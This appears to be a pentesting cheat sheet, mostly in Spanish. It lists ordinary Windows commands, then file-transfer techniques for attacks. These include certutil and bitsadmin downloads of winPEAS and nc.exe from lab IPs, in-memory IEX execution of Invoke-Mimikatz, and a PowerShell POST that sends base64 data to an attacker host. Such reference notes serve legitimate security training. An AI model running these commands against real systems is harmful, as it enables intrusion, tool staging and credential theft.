| Comando           | Descripción                                                                                                                                                                                                           |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Del**           | Elimina un archivo                                                                                                                                                                                                    |
| **Ren**           | Renombra un archivo o directorio                                                                                                                                                                                      |
| **Dir**           | Lista un directorio                                                                                                                                                                                                   |
| **Copy**          | Copia un archivo a otro lugar                                                                                                                                                                                         |
| **Move**          | Mueve un archivo a otro lugar                                                                                                                                                                                         |
| **Tasklist**      | Muestra una lista de procesos en ejecución                                                                                                                                                                            |
| **Taskill**       | Finaliza un proceso                                                                                                                                                                                                   |
| **Help**          | Muestra ayuda sobre un comando                                                                                                                                                                                        |
| **Netstat**       | Información de red                                                                                                                                                                                                    |
| **Taskmgr**       | Abre el Administrador de tareas                                                                                                                                                                                       |
| **Regedit**       | Abre el editor de registros                                                                                                                                                                                           |
| **Chkdsk**        | Verificar estado del disco                                                                                                                                                                                            |
| **Gpupdate**      | Actualiza las politicas de grupos                                                                                                                                                                                     |
| **Diskpart**      | Abre la utilidad de particionado de discos                                                                                                                                                                            |
| **Wmic**          | Abre la Consola de Instrumental de Administración de Windows (WMIC), que permite                                                                                                                                      |
| **Sfc / scannow** | Escanea y repara archivos del sistema dañados en Windows                                                                                                                                                              |
| **Bcdedit**       | Permite ver y modificar la configuración del almacén de datos de arranque de Windows (BCD, por sus siglas en inglés), que controla cómo se inicia Windows.                                                            |
| **Net user**      | Permite administrar cuentas de usuario en el sistema, incluyendo la creación, eliminación y modificación de cuentas.                                                                                                  |
| **Net share**     | Muestra y administra recursos compartidos en el equipo, como carpetas compartidas y recursos de impresión.                                                                                                            |
| **Mklink**        | Crea enlaces simbólicos o enlaces duros entre archivos o directorios. Un enlace simbólico es similar a un acceso directo en Windows, mientras que un enlace duro es una referencia directa a un archivo o directorio. |
| **Type**          | Muestra el contenido de uno o varios archivos de texto en la consola o terminal de comandos. Es similar al comando `cat` en sistemas Unix o Linux.                                                                    |
| **Reg**           | Trabajar con los registros de Windows                                                                                                                                                                                 |
| **msiexec**       | Ejecutar archivos msi                                                                                                                                                                                                 |
| **Runas**         | Runas es una característica que te permite ejecutar cualquier programa en nombre de otro usuario si conoces su contraseña                                                                                             |

# Instalar fichero desde servidor
```Powershell
certutil -urlcache -f http://10.9.0.160:8080/winPEASany_ofs.exe C:\Users\CyberLens\Desktop\WinPEAS.exe
```

# Ejecutar cmd desde otro usuario
```
runas /user:Administrator cmd
```


## **Net**
El comando `net` en Windows es una herramienta de línea de comandos que proporciona varias funciones relacionadas con la gestión de redes y recursos compartidos. A continuación, se muestran algunas de las opciones más comunes de `net` y sus descripciones:
- `net accounts`: Gestiona la configuración de cuentas de usuario.
- `net computer`: Agrega o elimina una relación entre una computadora y un grupo de trabajo.
- `net config`: Muestra o modifica la configuración del servidor de red.
- `net continue`: Continúa un trabajo que se ha suspendido.
- `net file`: Muestra o cierra archivos abiertos en recursos compartidos de red.
- `net group`: Administra grupos de usuarios.
- `net help`: Muestra ayuda para los comandos de red.
- `net localgroup`: Administra grupos locales de usuarios.
- `net name`: Agrega o elimina nombres de recursos compartidos de red.
- `net pause`: Pausa un trabajo que se está ejecutando.
- `net print`: Controla la impresión de archivos en una impresora compartida.
- `net send`: Envía un mensaje de texto a otros usuarios, computadoras o grupos.
- `net session`: Muestra información sobre sesiones de usuario en un servidor.
- `net share`: Administra recursos compartidos de archivos e impresoras.
- `net start`: Inicia un servicio.
- `net statistics`: Muestra estadísticas del servidor.
- `net stop`: Detiene un servicio.
- `net time`: Muestra o establece la hora del sistema.
- `net use`: Conecta o desconecta un equipo de un recurso compartido.
- `net user`: Administra cuentas de usuario.

| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                            | Download a file with PowerShell             |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Execute a file in memory using PowerShell   |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Download a file using Bitsadmin             |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Download a file using Certutil              |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | Download a file using PHP                   |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Download a file using SCP                   |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
